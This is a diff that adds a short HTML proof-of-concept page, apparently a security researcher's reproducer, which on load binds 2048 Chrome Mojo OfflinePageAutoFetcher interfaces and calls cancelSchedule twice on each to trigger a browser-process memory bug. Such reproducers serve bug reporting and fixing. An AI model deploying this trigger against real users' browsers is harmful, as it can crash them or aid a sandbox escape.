@@ -1,0 +1,32 @@
+<html>
+  <head>
+    <script src="/mojo_bindings.js"></script>
+    <script src="/gen/chrome/common/offline_page_auto_fetcher.mojom.js"></script>
+    <!--
+    <script src="/gen/chrome/common/offline_page_auto_fetcher.mojom.js"></script>
+    -->
+    <script>
+function poc() {
+  var N = 2048;
+  var array = [];
+
+  for (var i = 0; i < N; i++) {
+    array[i] = new chrome.mojom.OfflinePageAutoFetcherPtr();
+    Mojo.bindInterface(chrome.mojom.OfflinePageAutoFetcher.name,
+                       mojo.makeRequest(array[i]).handle);
+  }
+
+  setTimeout(function() {
+    for (var i = 0; i < N; i++) {
+      array[i].cancelSchedule();
+      array[i].cancelSchedule();
+    }
+  }, 500);
+}
+  </script>
+
+  </head>
+  <body onload="poc()" >
+    <h1> Child Frame </h1> 
+  </body>
+</html>
